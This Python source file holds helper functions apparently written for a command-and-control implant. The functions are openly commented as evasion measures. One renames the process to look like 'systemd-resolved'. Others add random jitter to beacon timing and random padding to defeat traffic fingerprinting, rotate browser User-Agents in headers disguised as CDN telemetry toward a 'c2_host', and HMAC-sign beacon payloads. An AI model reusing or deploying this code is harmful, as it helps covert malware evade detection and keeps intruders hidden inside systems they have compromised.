import sys
import os
import random
import time
import hmac
import hashlib
import string

def masquerade_process(process_name: str = "systemd-resolved"):
    """
    MASK-4: Obfuscates process identity in process list.
    Attempts to rename process title via setproctitle or ctypes prctl on Linux.
    """
    try:
        import setproctitle
        setproctitle.setproctitle(process_name)
    except Exception:
        pass
    try:
        if sys.platform.startswith("linux"):
            import ctypes
            libc = ctypes.CDLL("libc.so.6")
            PR_SET_NAME = 15
            b_name = process_name.encode("utf-8")
            libc.prctl(PR_SET_NAME, b_name, 0, 0, 0)
    except Exception:
        pass

def calculate_jittered_interval(base_interval: float, jitter_pct: float) -> float:
    """
    MASK-5: Calculates random sleep duration with jitter to prevent beacon periodicity detection
    e.g. 10s +- 35% -> interval between 6.5s and 13.5s
    """
    factor = jitter_pct / 100.0
    delta = base_interval * factor
    return max(1.0, random.uniform(base_interval - delta, base_interval + delta))

def generate_dummy_padding(min_bytes: int = 32, max_bytes: int = 128) -> str:
    """
    MASK-5: Generates random variable-length padding to disrupt packet size fingerprinting
    """
    length = random.randint(min_bytes, max_bytes)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
]

def get_disguised_headers(c2_host: str = "static-edge") -> dict:
    """
    MASK-2: HTTP headers simulating legitimate CDN/browser telemetry beacon.
    Rotates authentic User-Agents to prevent static fingerprinting.
    """
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "X-Edge-Origin": "AMS",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

def sign_telemetry_payload(
    trap_id: str,
    timestamp: float,
    nonce: str,
    secret_key: str,
    raw_body: bytes = b""
) -> str:
    """
    MASK-7: Generates HMAC-SHA256 signature for mutual authentication and replay prevention.
    Includes SHA-256 hash of the payload body (or empty bytes for GET requests).
    """
    body_hash = hashlib.sha256(raw_body).hexdigest()
    data_to_sign = f"{trap_id}:{timestamp}:{nonce}:{body_hash}".encode("utf-8")
    return hmac.new(secret_key.encode("utf-8"), data_to_sign, hashlib.sha256).hexdigest()
